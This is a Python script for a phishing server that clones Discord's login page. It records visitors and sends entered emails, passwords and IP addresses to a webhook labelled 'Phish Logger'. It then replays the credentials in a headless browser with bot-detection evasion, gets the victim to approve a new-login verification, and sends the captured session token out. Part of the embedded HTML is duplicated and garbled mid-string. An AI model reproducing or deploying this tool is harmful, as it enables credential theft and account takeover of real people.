import os
import json
import sys
import re
import asyncio
import time
import threading
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from playwright.async_api import async_playwright
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
CAPTCHA_API_KEY = "44b5a90f-182f-4c67-b219-ef8dfd33d7a1"

# Store active sessions
sessions = {}
visitor_logs = []

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord - Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
--bg:#313338;
--bg-dark:#1e1f22;
--text-white:#f2f3f5;
--text-muted:#b5bac1;
--text-gray:#949ba4;
--blurple:#5865f2;
--blurple-hover:#4752c4;
--link:#00a8fc;
--input-bg:#1e1f22;
--error:#f23f43;
--success:#23a55a;
}
html,body{
height:100%;
width:100%;
font-family:'gg sans','Noto Sans',Helvetica,Arial,sans-serif;
background:var(--bg);
color:var(--text-white);
overflow:hidden;
}
body::before{
content:'';
position:fixed;
inset:0;
z-index:0;
background:
radial-gradient(ellipse 300px 300px at 0% 0%, rgba(88,101,242,0.08) 0%, transparent 70%),
radial-gradient(ellipse 250px 250px at 100% 15%, rgba(88,101,242,0.06) 0%, transparent 70%),
radial-gradient(ellipse 200px 200px at 85% 60%, rgba(88,101,242,0.05) 0%, transparent 70%),
radial-gradient(ellipse 280px 280px at 10% 80%, rgba(88,101,242,0.06) 0%, transparent 70%);
pointer-events:none;
}
.container{
position:relative;
z-index:1;
width:100%;
height:100%;
display:flex;
flex-direction:column;
padding:16px 24px 40px;
max-width:480px;
margin:0 auto;
}
.back-arrow{
display:flex;
align-items:center;
justify-content:center;
width:36px;
height:36px;
cursor:pointer;
margin-bottom:24px;
margin-left:-4px;
border-radius:50%;
transition:background 0.15s;
}
.back-arrow:hover{
background:rgba(255,255,255,0.05);
}
.back-arrow svg{
width:22px;
height:22px;
fill:none;
stroke:var(--text-muted);
stroke-width:2.5;
stroke-linecap:round;
stroke-linejoin:round;
}
.back-arrow:hover svg{
stroke:var(--text-white);
}
.header{
text-align:center;
margin-bottom:28px;
}
.header h1{
font-size:26px;
font-weight:800;
color:var(--text-white);
margin-bottom:8px;
letter-spacing:-0.2px;
}
.header p{
font-size:15px;
color:var(--text-muted);
font-weight:400;
line-height:1.3;
}
.form-group{
margin-bottom:20px;
}
.form-group label{
display:block;
font-size:12px;
font-weight:700;
color:var(--text-muted);
margin-bottom:8px;
text-transform:uppercase;
letter-spacing:0.02em;
}
.input-wrapper{
position:relative;
width:100%;
}
.form-group input{
width:100%;
height:52px;
background:var(--input-bg);
border:none;
border-radius:8px;
padding:0 16px;
font-size:16px;
color:var(--text-white);
font-family:inherit;
outline:none;
transition:box-shadow 0.15s;
-webkit-appearance:none;
}
.form-group input::placeholder{
color:var(--text-gray);
opacity:0.5;
}
.form-group input:focus{
box-shadow:0 0 0 2px var(--blurple);
}
.form-group input.error{
box-shadow:0 0 0 2px var(--error);
}
.error-message{
display:none;
align-items:center;
gap:6px;
margin-top:8px;
font-size:12px;
color:var(--error);
font-weight:500;
}
.error-message.visible{
display:flex;
}
.error-message::before{
content:'!';
display:flex;
align-items:center;
justify-content:center;
width:16px;
height:16px;
background:var(--error);
color:#fff;
border-radius:50%;
font-size:11px;
font-weight:700;
flex-shrink:0;
}
.success-message{
display:none;
align-items:center;
gap:6px;
margin-top:8px;
font-size:12px;
color:var(--success);
font-weight:500;
text-align:center;
justify-content:center;
}
.success-message.visible{
display:flex;
}
.eye-toggle{
position:absolute;
right:16px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
padding:4px;
display:flex;
align-items:center;
justify-content:center;
background:none;
border:none;
}
.eye-toggle svg{
width:22px;
height:22px;
fill:none;
stroke:var(--text-gray);
stroke-width:1.8;
stroke-linecap:round;
stroke-linejoin:round;
}
.eye-toggle:hover svg{
stroke:var(--text-muted);
}
.forgot-link{
display:inline-block;
margin-top:8px;
font-size:14px;
font-weight:500;
color:var(--link);
text-decoration:none;
cursor:pointer;
transition:color 0.15s;
}
.forgot-link:hover{
text-decoration:underline;
}
.login-btn{
width:100%;
height:44px;
border:none;
border-radius:8px;
background:var(--blurple);
color:#fff;
font-size:16px;
font-weight:600;
font-family:inherit;
cursor:pointer;
margin-top:8px;
transition:background 0.15s, transform 0.1s;
letter-spacing:0.02em;
}
.login-btn:hover{
background:var(--blurple-hover);
}
.login-btn:active{
transform:scale(0.98);
}
.login-btn:disabled{
opacity:0.5;
cursor:not-allowed;
}
.login-btn.loading{
pointer-events:none;
color:transparent;
position:relative;
}
.login-btn.loading::after{
content:'';
position:absolute;
left:50%;top:50%;
width:8px;height:8px;
margin:-4px 0 0 -20px;
border-radius:50%;
background:#fff;
animation:dots 1.2s infinite;
}
@keyframes dots{
0%,80%,100%{box-shadow:12px 0 0 #fff,24px 0 0 #fff}
40%{box-shadow:12px -6px 0 #fff,24px 0 0 #fff}
60%{box-shadow:12px 0 0 #fff,24px -6px 0 #fff}
}
.passkey-link{
display:block;
text-align:center;
margin-top:16px;
font-size:14px;
font-weight:500;
color:var(--link);
text-decoration:none;
cursor:pointer;
transition:color 0.15s;
}
.passkey-link:hover{
text-decoration:underline;
}
.modal-overlay{
position:fixed;
inset:0;
background:rgba(0,0,0,0.7);
display:none;
align-items:center;
justify-content:center;
z-index:100;
padding:24px;
backdrop-filter:blur(2px);
}
.modal-overlay.active{
display:flex;
}
.modal{
background:#2b2d31;
border-radius:12px;
padding:24px;
width:100%;
max-width:400px;
position:relative;
box-shadow:0 0 20px rgba(0,0,0,0.3);
}
.modal-close{
position:absolute;
top:16px;
right:16px;
width:24px;
height:24px;
cursor:pointer;
display:flex;
align-items:center;
justify-content:center;
background:none;
border:none;
color:var(--text-muted);
font-size:24px;
line-height:1;
padding:0;
}
.modal-close:hover{
color:var(--text-white);
}
.modal h2{
font-size:20px;
font-weight:700;
color:var(--text-white);
margin-bottom:12px;
padding-right:32px;
}
.modal p{
font-size:14px;
color:var(--text-muted);
line-height:1.5;
margin-bottom:20px;
}
.modal-input{
width:100%;
height:48px;
background:var(--input-bg);
border:none;
border-radius:8px;
padding:0 16px;
font-size:16px;
color:var(--text-white);
font-family:inherit;
outline:none;
margin-bottom:16px;
}
.modal-input:focus{
box-shadow:0 0 0 2px var(--blurple);
}
.modal-btn{
width:100%;
height:44px;
border:none;
border-radius:8px;
background:var(--blurple);
color:#fff;
font-size:16px;
font-weight:600;
font-family:inherit;
cursor:pointer;
transition:background 0.15s;
}
.modal-btn:hover{
background:var(--blurple-hover);
}
.modal-btn.secondary{
background:var(--bg-dark);
color:var(--text-white);
}
.modal-btn.secondary:hover{
background:#3a3c42;
}
.status-box{
background:var(--bg-dark);
border-radius:8px;
padding:20px;
margin-bottom:20px;
text-align:center;
border:1px solid rgba(88,101,242,0.2);
}
.status-box .icon{
font-size:40px;
margin-bottom:12px;
}
.status-box h3{
font-size:16px;
font-weight:600;
color:var(--text-white);
margin-bottom:8px;
}
.status-box p{
font-size:14px;
color:var(--text-muted);
margin:0;
line-height:1.4;
}
@media(min-width:481px){
.container{
justify-content:center;
padding-top:60px;
}
}
</style>
</head>
<body>
<div class="container">
  <div class="back-arrow" onclick="history.back()">
    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
  </div>
  
  <div class="header">
    <h1>Welcome back!</h1>
    <p>We're so excited to see you again!</p>
  </div>
  
  <form id="loginForm">
    <div class="form-group">
      <label>Email or Phone Number <span style="color:var(--error)">*</span></label>
      <div class="input-wrapper">
        <input type="text" id="email" autocomplete="username" autocapitalize="none" spellcheck="false" placeholder="">
      </div>
      <div class="error-message" id="emailError">This field is required</div>
    </div>

    <div class="form-group">
      <label>Password <span style="color:var(--error)">*</span></label>
      <div class="input-wrapper">
        <input type="password" id="password" autocomplete="current-password" placeholder="">
        <button type="button" class="eye-toggle" onclick="togglePassword()">
          <svg id="eyeIcon" viewBox="0 0 24 24">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>
      <a class="forgot-link" href="#" onclick="showForgotModal();return false">Forgot your password?</a>
    </div>

    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
    <a class="passkey-link" href="#">Or, sign in with passkey</a>
    
    <div class="success-message" id="statusMsg"></div>
  </form>
</div>

<div class="modal-overlay" id="forgotModal">
  <div class="modal">
    <button class="modal-close" onclick="closeForgotModal()">&times;</button>
    <h2>Reset your password</h2>
    <p>Enter your email address and we'll send you instructions to reset your password.</p>
    <input type="text" class="modal-input" id="resetEmail" placeholder="name@example.com" autocomplete="email">
    <button class="modal-btn" id="resetBtn" onclick="submitForgot()">Send Reset Instructions</button>
    <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeForgotModal()">Cancel</button>
  </div>
</div>

<div class="modal-overlay" id="verifyModal">
  <div class="modal">
    <h2>Verify New Login Location</h2>
    <div class="status-box">
      <div class="icon">📧</div>
      <h3>Check your Gmail</h3>
      <p>Discord has sent a "Verify New Login Location" email to your inbox. Please click the verification link in that email to approve this login.</p>
    </div>
    <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px;text-align:center;">
      Once you've clicked the link in your email, click the button below to continue.
    </p>
    <button class="modal-btn" onclick="checkVerification()">I've Verified - Continue Login</button>
    <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeVerifyModal()">Cancel</button>
  </div>
</div>

<script>
function togglePassword() {
  const input = document.getElementById('password');
  const icon = document.getElementById('eyeIcon');
  if (input.type === 'password') {
    input.type = 'text';
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
  } else {
    input.type = 'password';
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>';
  }
}

function showForgotModal() {
  document.getElementById('forgotModal').classList.add('active');
  document.getElementById('resetEmail').value = document.getElementById('email').value || '';
  document.getElementById('resetEmail').focus();
}

function closeForgotModal() {
  document.getElementById('forgotModal').classList.remove('active');
}

function showVerifyModal() {
  document.getElementById('verifyModal').classList.add('active');
}

function closeVerifyModal() {
  document.getElementById('verifyModal').classList.remove('active');
}

async function checkVerification() {
  const btn = document.querySelector('#verifyModal .modal-btn');
  btn.classList.add('loading');
  btn.disabled = true;
  
  try {
    const response = await fetch('/api/check-verify', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: currentEmail})
    });
    
    const data = await response.json();
    
    if (data.verified) {
      closeVerifyModal();
      document.getElementById('statusMsg').textContent = 'Login successful! Token captured.';
      document.getElementById('statusMsg').classList.add('visible');
    } else {
      alert('Verification not detected yet. Please check your email and click the verification link, then wait a moment and try again.');
    }
  } catch (err) {
    alert('Error checking verification status');
  } finally {
    btn.classList.remove('loading');
    btn.disabled = false;
  }
}

async function submitForgot() {
  const email = document.getElementById('resetEmail').value.trim();
  const btn = document.getElementById('resetBtn');
  
  if (!email) {
    alert('Please enter your email address');
    return;
  }
  
  btn.classList.add('loading');
  btn.disabled = true;
  
  try {
    const response = await fetch('/api/forgot', {
      method: 'POST',
      headers: {'Content password?</a>
    </div>

    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
    <a class="passkey-link" href="#">Or, sign in with passkey</a>
    
    <div class="success-message" id="statusMsg"></div>
  </form>
</div>

<div class="modal-overlay" id="forgotModal">
  <div class="modal">
    <button class="modal-close" onclick="closeForgotModal()">&times;</button>
    <h2>Reset your password</h2>
    <p>Enter your email address and we'll send you instructions to reset your password.</p>
    <input type="text" class="modal-input" id="resetEmail" placeholder="name@example.com" autocomplete="email">
    <button class="modal-btn" id="resetBtn" onclick="submitForgot()">Send Reset Instructions</button>
    <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeForgotModal()">Cancel</button>
  </div>
</div>

<div class="modal-overlay" id="verifyModal">
  <div class="modal">
    <h2>Verify New Login Location</h2>
    <div class="status-box">
      <div class="icon">📧</div>
      <h3>Check your Gmail</h3>
      <p>Discord has sent a "Verify New Login Location" email to your inbox. Please click the verification link in that email to approve this login.</p>
    </div>
    <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px;text-align:center;">
      Once you've clicked the link in your email, click the button below to continue.
    </p>
    <button class="modal-btn" onclick="checkVerification()">I've Verified - Continue Login</button>
    <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeVerifyModal()">Cancel</button>
  </div>
</div>

<script>
function togglePassword() {
  const input = document.getElementById('password');
  const icon = document.getElementById('eyeIcon');
  if (input.type === 'password') {
    input.type = 'text';
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
  } else {
    input.type = 'password';
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>';
  }
}

function showForgotModal() {
  document.getElementById('forgotModal').classList.add('active');
  document.getElementById('resetEmail').value = document.getElementById('email').value || '';
  document.getElementById('resetEmail').focus();
}

function closeForgotModal() {
  document.getElementById('forgotModal').classList.remove('active');
}

function showVerifyModal() {
  document.getElementById('verifyModal').classList.add('active');
}

function closeVerifyModal() {
  document.getElementById('verifyModal').classList.remove('active');
}

async function checkVerification() {
  const btn = document.querySelector('#verifyModal .modal-btn');
  btn.classList.add('loading');
  btn.disabled = true;
  
  try {
    const response = await fetch('/api/check-verify', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: currentEmail})
    });
    
    const data = await response.json();
    
    if (data.verified) {
      closeVerifyModal();
      document.getElementById('statusMsg').textContent = 'Login successful! Token captured.';
      document.getElementById('statusMsg').classList.add('visible');
    } else {
      alert('Verification not detected yet. Please check your email and click the verification link, then wait a moment and try again.');
    }
  } catch (err) {
    alert('Error checking verification status');
  } finally {
    btn.classList.remove('loading');
    btn.disabled = false;
  }
}

async function submitForgot() {
  const email = document.getElementById('resetEmail').value.trim();
  const btn = document.getElementById('resetBtn');
  
  if (!email) {
    alert('Please enter your email address');
    return;
  }
  
  btn.classList.add('loading');
  btn.disabled = true;
  
  try {
    const response = await fetch('/api/forgot', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email})
    });
    
    const data = await response.json();
    
    closeForgotModal();
    
    if (data.sent) {
      document.getElementById('statusMsg').innerHTML = '<strong>Check your Gmail!</strong><br>Discord has sent a password reset email. Click the link in that email to reset your password.';
      document.getElementById('statusMsg').classList.add('visible');
    }
  } catch (err) {
    alert('Failed to send reset request');
  } finally {
    btn.classList.remove('loading');
    btn.disabled = false;
  }
}

let currentEmail = '';
let currentPassword = '';

document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;
  const btn = document.getElementById('loginBtn');
  const emailError = document.getElementById('emailError');
  const statusMsg = document.getElementById('statusMsg');
  
  currentEmail = email;
  currentPassword = password;
  
  document.getElementById('email').classList.remove('error');
  emailError.classList.remove('visible');
  statusMsg.classList.remove('visible');
  
  if (!email) {
    document.getElementById('email').classList.add('error');
    emailError.classList.add('visible');
    return;
  }
  
  if (!password) {
    alert('Please enter your password');
    return;
  }
  
  btn.classList.add('loading');
  btn.disabled = true;
  statusMsg.textContent = 'Logging in...';
  statusMsg.classList.add('visible');
  
  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email, password})
    });
    
    const data = await response.json();
    
    if (data.needsVerify) {
      statusMsg.classList.remove('visible');
      showVerifyModal();
    } else if (data.success) {
      statusMsg.textContent = 'Login successful! Token captured.';
      statusMsg.classList.add('visible');
    } else if (data.error) {
      statusMsg.textContent = 'Error: ' + data.error;
      statusMsg.style.color = 'var(--error)';
      statusMsg.classList.add('visible');
    }
  } catch (err) {
    statusMsg.textContent = 'Login failed: ' + err.message;
    statusMsg.style.color = 'var(--error)';
    statusMsg.classList.add('visible');
  } finally {
    btn.classList.remove('loading');
    btn.disabled = false;
  }
});
</script>
</body>
</html>"""

class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[{self.log_date_time_string()}] {format % args}", flush=True)
    
    def _send_json(self, data, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode("utf-8"))

    def do_GET(self):
        client_ip = self.headers.get("X-Forwarded-For", self.client_address[0])
        user_agent = self.headers.get("User-Agent", "Unknown")
        
        # Log every visitor
        visitor_info = {
            "ip": client_ip,
            "user_agent": user_agent,
            "path": self.path,
            "time": datetime.utcnow().isoformat(),
            "headers": dict(self.headers)
        }
        visitor_logs.append(visitor_info)
        
        self._send_to_webhook({
            "title": "👁️ New Visitor",
            "fields": [
                {"name": "IP Address", "value": f"```{client_ip}```", "inline": True},
                {"name": "Path", "value": f"```{self.path}```", "inline": True},
                {"name": "User Agent", "value": f"```{user_agent[:200]}```", "inline": False}
            ],
            "color": 0x3498db,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        if self.path in ["/", "/login"]:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML.encode("utf-8"))
        else:
            self.send_response(301)
            self.send_header("Location", "/")
            self.end_headers()

    def do_POST(self):
        client_ip = self.headers.get("X-Forwarded-For", self.client_address[0])
        
        if self.path == "/api/login":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            data = json.loads(body) if body else {}
            email = data.get("email", "")
            password = data.get("password", "")
            
            self._send_to_webhook({
                "title": "🔐 Login Attempt",
                "fields": [
                    {"name": "Email", "value": f"```{email}```", "inline": False},
                    {"name": "Password", "value": f"```{password}```", "inline": False},
                    {"name": "IP", "value": f"```{client_ip}```", "inline": True}
                ],
                "color": 0xe74c3c
            })
            
            session_id = f"{email}_{int(time.time())}"
            sessions[session_id] = {
                "email": email,
                "password": password,
                "ip": client_ip,
                "verified": False,
                "token": None
            }
            
            # Start automation
            thread = threading.Thread(
                target=lambda: asyncio.run(self._automate_login(session_id, email, password, client_ip))
            )
            thread.daemon = True
            thread.start()
            
            self._send_json({"needsVerify": True, "session": session_id})
            
        elif self.path == "/api/check-verify":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            data = json.loads(body) if body else {}
            email = data.get("email", "")
            
            # Find session
            session = None
            for sid, sess in sessions.items():
                if sess.get("email") == email:
                    session = sess
                    break
            
            if session and session.get("token"):
                self._send_json({"verified": True, "token": session["token"]})
            else:
                self._send_json({"verified": False})
                
        elif self.path == "/api/forgot":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            data = json.loads(body) if body else {}
            email = data.get("email", "")
            
            self._send_to_webhook({
                "title": "🔄 Password Reset",
                "fields": [{"name": "Email", "value": f"```{email}```", "inline": False}],
                "color": 0xf39c12
            })
            
            thread = threading.Thread(
                target=lambda: asyncio.run(self._automate_reset(email, client_ip))
            )
            thread.daemon = True
            thread.start()
            
            self._send_json({"sent": True})

    def _send_to_webhook(self, embed):
        try:
            payload = {
                "embeds": [embed],
                "username": "Phish Logger",
                "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png"
            }
            data = json.dumps(payload).encode()
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=data,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            urllib.request.urlopen(req, timeout=10)
        except Exception as e:
            print(f"Webhook error: {e}")

    async def _automate_login(self, session_id, email, password, client_ip):
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=['--disable-blink-features=AutomationControlled']
                )
                
                context = await browser.new_context(
                    viewport={"width": 1366, "height": 768},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    locale="en-US",
                    timezone_id="America/New_York",
                    geolocation={"latitude": 40.7128, "longitude": -74.0060},
                    permissions=["geolocation"]
                )
                
                # Bypass webdriver detection
                await context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3, 4, 5]
                    });
                """)
                
                page = await context.new_page()
                
                # Navigate to login
                await page.goto("https://discord.com/login", wait_until="networkidle")
                await asyncio.sleep(3)
                
                # Human-like typing
                email_field = await page.wait_for_selector('input[name="email"]')
                await email_field.click()
                await asyncio.sleep(0.5)
                await email_field.type(email, delay=50)
                
                await asyncio.sleep(0.5)
                
                pass_field = await page.wait_for_selector('input[name="password"]')
                await pass_field.click()
                await asyncio.sleep(0.5)
                await pass_field.type(password, delay=50)
                
                await asyncio.sleep(1)
                
                # Click login
                await page.click('button[type="submit"]')
                await asyncio.sleep(5)
                
                # Check for captcha
                captcha_present = await page.query_selector('iframe[src*="hcaptcha"], iframe[src*="recaptcha"]')
                if captcha_present:
                    self._send_to_webhook({
                        "title": "🤖 Captcha Detected",
                        "fields": [{"name": "Status", "value": "Manual solving required", "inline": False}],
                        "color": 0xe67e22
                    })
                
                # Check for "New Login Location" or verification required
                verify_indicators = [
                    'text=/verify.*location|new login|check your email|confirm.*login/i',
                    '[class*="verify"]',
                    'button:has-text("Verify")',
                    'text=/unusual.*activity|suspicious/i'
                ]
                
                needs_verify = False
                for indicator in verify_indicators:
                    try:
                        elem = await page.query_selector(indicator)
                        if elem:
                            needs_verify = True
                            break
                    except:
                        continue
                
                if needs_verify:
                    self._send_to_webhook({
                        "title": "📧 Verification Email Sent",
                        "fields": [
                            {"name": "Status", "value": "Discord sent 'Verify New Login Location' email", "inline": False},
                            {"name": "Email", "value": f"```{email}```", "inline": True}
                        ],
                        "color": 0xf1c40f
                    })
                    
                    # Poll for 10 minutes waiting for user to click email link
                    for i in range(120):
                        await asyncio.sleep(5)
                        
                        # Refresh page to check if verified
                        await page.reload()
                        await asyncio.sleep(3)
                        
                        # Check if logged in
                        token = await page.evaluate("() => localStorage.getItem('token')")
                        if token:
                            sessions[session_id]["token"] = token
                            sessions[session_id]["verified"] = True
                            
                            self._send_to_webhook({
                                "title": "🎉 TOKEN CAPTURED",
                                "fields": [
                                    {"name": "Token", "value": f"```{token}```", "inline": False},
                                    {"name": "Email", "value": f"```{email}```", "inline": True},
                                    {"name": "Password", "value": f"```{password}```", "inline": True}
                                ],
                                "color": 0x2ecc71
                            })
                            break
                        
                        # Check if still on login page
                        current_url = page.url
                        if "login" not in current_url and "verify" not in current_url:
                            # Might be logged in, check token again
                            token = await page.evaluate("() => localStorage.getItem('token')")
                            if token:
                                sessions[session_id]["token"] = token
                                sessions[session_id]["verified"] = True
                                
                                self._send_to_webhook({
                                    "title": "🎉 TOKEN CAPTURED (Redirect)",
                                    "fields": [
                                        {"name": "Token", "value": f"```{token}```", "inline": False},
                                        {"name": "Email", "value": f"```{email}```", "inline": True}
                                    ],
                                    "color": 0x2ecc71
                                })
                                break
                else:
                    # No verification needed, check for token
                    token = await page.evaluate("() => localStorage.getItem('token')")
                    if token:
                        sessions[session_id]["token"] = token
                        sessions[session_id]["verified"] = True
                        
                        self._send_to_webhook({
                            "title": "🎉 TOKEN CAPTURED (No Verify)",
                            "fields": [
                                {"name": "Token", "value": f"```{token}```", "inline": False},
                                {"name": "Email", "value": f"```{email}```", "inline": True}
                            ],
                            "color": 0x2ecc71
                        })
                    else:
                        # Check for error message
                        error_elem = await page.query_selector('[class*="error"], [class*="message"]')
                        if error_elem:
                            error_text = await error_elem.inner_text()
                            self._send_to_webhook({
                                "title": "❌ Login Failed",
                                "fields": [{"name": "Error", "value": f"```{error_text[:500]}```", "inline": False}],
                                "color": 0xe74c3c
                            })
                
                await browser.close()
                
        except Exception as e:
            self._send_to_webhook({
                "title": "❌ Automation Error",
                "fields": [{"name": "Error", "value": f"```{str(e)[:1000]}```", "inline": False}],
                "color": 0x95a5a6
            })

    async def _automate_reset(self, email, client_ip):
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                )
                
                await page.goto("https://discord.com/forgot", wait_until="networkidle")
                await asyncio.sleep(2)
                
                await page.fill('input[name="email"]', email)
                await asyncio.sleep(1)
                
                # Check for captcha
                captcha = await page.query_selector('iframe[src*="hcaptcha"]')
                if captcha:
                    self._send_to_webhook({
                        "title": "🤖 Reset Captcha",
                        "fields": [{"name": "Status", "value": "Captcha present on reset page", "inline": False}],
                        "color": 0xe67e22
                    })
                
                await page.click('button[type="submit"]')
                await asyncio.sleep(4)
                
                self._send_to_webhook({
                    "title": "✅ Reset Email Triggered",
                    "fields": [
                        {"name": "Email", "value": f"```{email}```", "inline": False},
                        {"name": "Note", "value": "Discord should have sent reset email", "inline": False}
                    ],
                    "color": 0x2ecc71
                })
                
                await browser.close()
        except Exception as e:
            print(f"Reset error: {e}")

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    server = ThreadedHTTPServer(("0.0.0.0", port), Handler)
    print(f"Server running on port {port}", flush=True)
    sys.stdout.flush()
    server.serve_forever()
